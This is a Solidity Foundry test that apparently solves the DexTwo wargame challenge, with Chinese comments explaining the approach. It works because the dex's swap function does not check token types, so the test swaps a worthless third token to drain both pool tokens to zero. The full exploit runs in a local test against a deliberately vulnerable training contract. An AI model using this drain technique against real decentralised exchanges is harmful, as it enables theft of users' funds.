pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {DexTwo, SwappableTokenTwo} from "../src/DexTwo.sol";


/** 
 * 解题思路：swap 中没有限定 token 的种类，可以加入第三种 token，将前两种 token 都换出来
 */
contract HackDexTwoTest is Test {
    address hacker = address(1111111111111111);
    address hacker2 = address(2222222222222222);
    DexTwo public d;
    SwappableTokenTwo public s1;
    SwappableTokenTwo public s2;
    SwappableTokenTwo public s3;

    function setUp() public {
        vm.deal(hacker, 1 ether);
        vm.deal(hacker2, 1 ether);
    }
    function testHackDexTwo() public {
        vm.startPrank(hacker);
        d = new DexTwo();
        s1 = new SwappableTokenTwo(address(d), "S1", "S1", 10000);
        s2 = new SwappableTokenTwo(address(d), "S2", "S2", 10000);
        s3 = new SwappableTokenTwo(address(d), "S3", "S3", 10000);

        console.log("S1 balance");
        console.logUint(s1.balanceOf(hacker));
        console.log("S2 balance");
        console.logUint(s2.balanceOf(hacker));
        console.log("S3 balance");
        console.logUint(s2.balanceOf(hacker));

        // 向 dex 中添加流动性
        d.setTokens(address(s1), address(s2));
        s1.transfer(address(d), 100);
        s2.transfer(address(d), 100);
        s3.transfer(address(d), 100);
        // 给攻击账号准备初始资金
        s1.transfer(hacker2, 10);
        s2.transfer(hacker2, 10);
        s3.transfer(hacker2, 300);

        vm.stopPrank();

        // 开始交换资金并让 s1 归零
        vm.startPrank(hacker2);

        // 授权 dex 操作自己的资金
        d.approve(address(d), 10000);
        s3.approve(address(d), 10000);

        console.log("attacker S1 balance");
        console.logUint(s1.balanceOf(hacker2));
        console.log("attacker S2 balance");
        console.logUint(s2.balanceOf(hacker2));

        d.swap(address(s3), address(s1), 100);
        d.swap(address(s3), address(s2), 200);

        assert(s1.balanceOf(address(d)) == 0);
        assert(s2.balanceOf(address(d)) == 0);

        vm.stopPrank();
    }
}